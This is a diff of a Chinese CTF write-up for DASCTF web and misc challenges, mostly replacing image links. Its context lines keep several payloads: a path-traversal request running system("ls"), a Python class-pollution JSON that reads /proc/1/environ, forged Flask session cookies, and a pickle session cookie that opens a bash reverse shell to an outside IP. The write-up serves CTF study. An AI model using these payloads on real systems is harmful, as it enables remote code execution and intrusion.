@@ -78,17 +78,19 @@ payload：
 
 /admin?r=../../../../../tmp/hello&1=system("ls");
 ```
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690010441609-eb962b83-11c1-4334-a573-4288e759435a.png#averageHue=%23f4f3f2&clientId=u3293cff2-3606-4&from=paste&id=u4e20a595&originHeight=687&originWidth=1280&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u52f6710d-e1ac-494a-a95c-10efd08086c&title=)
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690010441601-0513b4d8-bed4-45eb-9d1c-d25cda17ddc4.png#averageHue=%23666461&clientId=u3293cff2-3606-4&from=paste&id=uc93f670c&originHeight=687&originWidth=1291&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u7980c83b-f04a-4a23-a699-146a7ddfec6&title=)
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690010441602-78b7d622-029a-476d-afd3-4e914b904b9c.png#averageHue=%23676563&clientId=u3293cff2-3606-4&from=paste&id=ua94b2374&originHeight=687&originWidth=1291&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u93e933ee-63c2-4b5d-868f-3f0dcf269ce&title=)
+![image-20230805012133313](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121477.png)
+![image-20230805012141200](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121401.png)
+![image-20230805012151280](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121461.png)
+
 ### MyPicDisk
 反引号执行命令；base64编码绕过
 /y0u_cant_find_1t.zip，查看源码
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690859133317-0625ac67-f133-4993-b762-78718bf99b4d.png#averageHue=%23292d37&clientId=u786887c5-3901-4&from=paste&height=302&id=u19288c66&originHeight=302&originWidth=777&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29258&status=done&style=none&taskId=u4cc61da5-ff3b-451c-bc0c-51e688ee1aa&title=&width=777)
+![image-20230805012220243](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050122371.png)
 （为什么admin'能绕过
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690859168112-9e83ab3a-188a-4818-971f-b11ccc0e9769.png#averageHue=%23282d36&clientId=u786887c5-3901-4&from=paste&height=691&id=ud2e6e1bd&originHeight=691&originWidth=1143&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57640&status=done&style=none&taskId=ubeb70aed-cc85-416c-8e5d-5d041ed20f7&title=&width=1143)
+![image-20230805012244806](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050122984.png)
 文件名用命令拼接，先上传再访问
 payload：
+
 ```javascript
 import base64
 import requests
@@ -122,8 +124,9 @@ payload：
 ```json
 {"username":"mof","password":"mof","\u0000\u005f\u0000\u005f\u0000\u0069\u0000\u006e\u0000\u0069\u0000\u0074\u0000\u005f\u0000\u005f":{"__globals__": {"__file__":"/proc/1/environ"}}}
 ```
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690018621749-cdad5f48-5feb-4041-bfe8-32a92703fb7c.png#averageHue=%23f5f4f4&clientId=ube290e2a-5937-4&from=paste&height=687&id=u5b42a0c6&originHeight=687&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94820&status=done&style=none&taskId=u98ae6f50-7d4c-4046-bfd7-517dd464862&title=&width=1280)
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690018591377-45ffee6a-1df8-4961-a4d0-c94edaa13d0f.png#averageHue=%236a6968&clientId=ube290e2a-5937-4&from=paste&height=687&id=u57488aea&originHeight=687&originWidth=1291&originalType=binary&ratio=1&rotation=0&showTitle=false&size=127074&status=done&style=none&taskId=u69ad0b04-8501-4379-a0fb-78352749deb&title=&width=1291)
+![image-20230805012316817](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050123989.png)
+![image-20230805012325897](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050123022.png)
+
 ### ez_py
 sessioin pickle反序列化
 [https://boogipop.com/2023/07/22/DASCTF%202023%20&%200X401%20Web%20WriteUp/#ez-py](https://boogipop.com/2023/07/22/DASCTF%202023%20&%200X401%20Web%20WriteUp/#ez-py)
@@ -312,7 +315,8 @@ def exp(self):
 gASVYgAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlCiMNGJhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTE5LjI5LjIwNy4yNy8zMDAwIDwmMSKUhZRK_____05OTk5OiYh0lFKULg:1qQe0Y:JrXwUfbqSYlYlhRUQ6XKt86TyL4
 ```
 在login时抓包，更改session，反弹shell（POST好像不行
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690852679552-8c85fc14-63b8-46d5-9a54-a70e9f93e2fc.png#averageHue=%23f6f3f3&clientId=uc4ad73ec-5559-4&from=paste&height=285&id=ucc0fd0f3&originHeight=285&originWidth=748&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40766&status=done&style=none&taskId=u5701d639-3914-4f5f-bba4-8ef62fd6b93&title=&width=748)
+![image-20230805012338403](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050123479.png)
+
 ### ez_timing
 HTTP/2；timing
 [https://github.com/ConnorNelson/spaceless-spacing](https://github.com/ConnorNelson/spaceless-spacing)
@@ -324,9 +328,10 @@ curl --http2-prior-knowledge -I 139.155.99.122:12003/getkey （HEAD请求）
 curl --http2-prior-knowledge -X POST 139.155.99.122:12003/getkey （POST请求）
 ```
 需要爆破密钥，使用flask-unsign
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1691054200432-156b7935-003a-48f3-8b10-edb20476cf07.png#averageHue=%23101010&clientId=u6561ac37-4c55-4&from=paste&height=70&id=u027296e8&originHeight=70&originWidth=956&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12641&status=done&style=none&taskId=u9747366a-6540-497c-949d-120a7871043&title=&width=956)
+![image-20230805012345912](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050123983.png)
 flask-sessioin-cookie-manager3.py伪造cookie
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1691054512859-e935311d-cc3c-41d1-9e73-e79911e2adc8.png#averageHue=%23191919&clientId=u6561ac37-4c55-4&from=paste&height=83&id=uba9723a6&originHeight=83&originWidth=1024&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16960&status=done&style=none&taskId=u46613808-2d78-42f6-bae2-79d30317e05&title=&width=1024)
+![image-20230805012351360](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050123462.png)
+
 ```javascript
 
 curl --http2-prior-knowledge -H "Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.ZL6kNA.shduF_TuEL8rRpIZMugxe36Ovas;" 139.155
@@ -391,10 +396,10 @@ def check_flag(secret):
 ## MISC
 ### ezFAT32
 fs.img用010 editor打开
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690010472350-51d3015b-d2d6-4c0e-84cd-058ca3ee38f7.png#averageHue=%233d3b36&clientId=u3293cff2-3606-4&from=paste&id=udb92fb7e&originHeight=91&originWidth=633&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u32933a96-91c2-498f-8ecf-408d5022b38&title=)
+![image-20230805012405950](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050124064.png)
 bmp文件头42 4D，把前面多余的和后面的00去掉，另存为.bmp
 [https://www.strerr.com/cn/sha256_file.html ](https://www.strerr.com/cn/sha256_file.html )
 算出sha256
 解压压缩包，拿到flag
-（注意把flag里的dasctf换成flag提交）
+（注意把flag里的dasctf换成flag提交)
 
